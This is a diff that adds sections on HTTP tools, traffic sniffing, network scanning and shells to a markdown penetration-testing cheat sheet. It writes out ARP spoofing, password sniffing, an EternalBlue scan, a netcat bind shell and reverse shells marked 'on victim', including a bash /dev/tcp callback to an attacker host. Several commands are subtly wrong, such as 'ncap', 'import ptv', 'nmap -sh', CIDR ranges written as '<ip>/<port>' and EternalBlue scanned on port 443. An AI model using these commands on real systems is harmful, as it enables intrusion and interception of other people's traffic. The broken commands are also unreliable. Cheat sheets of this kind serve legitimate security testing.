@@ -129,8 +129,177 @@ socat TCP-LISTEN:<port>,fork,reuseaddr ssl:<url>:<port>
 
 ## HTTP Tools
 
+#### Start Python Webserver on PORT <port>
+
+```bash
+python3 -m http.server 2305
+```
+
+#### Perform HTTP Request
+
+```bash
+curl http://<ip / url>
+```
+
+#### Scan for Common Files / Applications / Configs
+
+```bash
+nikto -host <url>
+```
+
+#### Enumerate Connon Directory / Filenames
+
+```bash
+gobuster -u <url> -w <dir>
+```
+
 ## Sniffing
+
+#### Arp Spoofing
+
+```bash
+arpspoof -t <ip-1><ip-2>
+```
+
+#### Graphical Tool
+
+```bash
+ettercap -G
+```
+
+#### Show ARP Cache
+
+```bash
+ip neigh
+```
+
+#### Delete API Cache
+
+```bash
+ip neigh flush all
+```
+
+#### Sniff Traffic
+
+```bash
+tcpdump [options] [filters]
+```
+
+#### Sniffing Over SSH on Remote Host
+
+```bash
+ssh <ip> tcpdump -w- port not ssh | wireshark -k -i -
+```
+
+#### Search in Network Traffic
+
+```bash
+ngrep -i password
+```
+
+#### Show HTTP GET Requests
+
+```bash
+urlsnarf
+```
+
+#### Show Transmitted Images
+
+```bash
+driftnet
+```
 
 ## Network Scanning
 
+#### ARP Scan
+
+```bash
+nmap -n -sn -PR <ip>/<port>
+```
+
+#### Reverse DNS Lookup of IP Range
+
+```bash
+nmap -sL <ip>/<port>
+```
+
+#### Nmap Host Discovery (API, ICMP, SYN 443.tcp, ACK 80/tcp)
+
+```bash
+nmap -sh -n <ip>/<port>
+```
+
+#### TCP Scan (SYN scan = half-open scan)
+
+```bash
+nmap -Pn -n -sS -p 22,25,80,443,8080 <ip>/<port>
+```
+
+#### List Nmap Scripts
+
+```bash
+ls /usr/share/nmap/scripts
+```
+
+#### Scan for EternalBlue vulnerable hosts
+
+```bash
+nmap -n -Pn -p 443 --script smb-vuln-ms17-010 <ip>/<port>
+```
+
+#### Scan for vulnerabilities
+
+```bash
+nmap -n -Pn --script "vuln and safe" <ip>/<port>
+```
+
+#### Performance Testing (1 SYN packet = 60 bytes -> 20'000 packets/s = 10Mbps)
+
+```bash
+nmap -n -Pn --min-rate 20000 <ip>/<port>
+```
+
+#### Fast Scan Using Masscan
+
+```bash
+masscan -p80,8000:8100 --rate 20000 <ip>/<port>
+```
+
 ## Shells
+
+#### Start Bind Shell
+
+```bash
+ncat -l -p 2305 -e "/bin/bash -i"
+```
+
+#### Connect to Bind Shell (on attacker)
+
+```bash
+ncat <ip> <port>
+```
+
+#### Listen for Reverse Shell (on attacker)
+
+```bash
+ncap -l -p <port>
+```
+
+#### Start Reverse Shell (on victim)
+
+```bash
+ncat -e "/bin/bash -i" <ip> <port>
+```
+
+#### Start Reverse Shell with Bash Only (on victim)
+
+```bash
+bash -i &>/dev/tcp/<ip>/<port> 0>&1
+```
+
+#### Upgrade to psuedo terminal
+
+```bash
+python -c 'import ptv';
+pty.spawn("/bin/bash")
+```
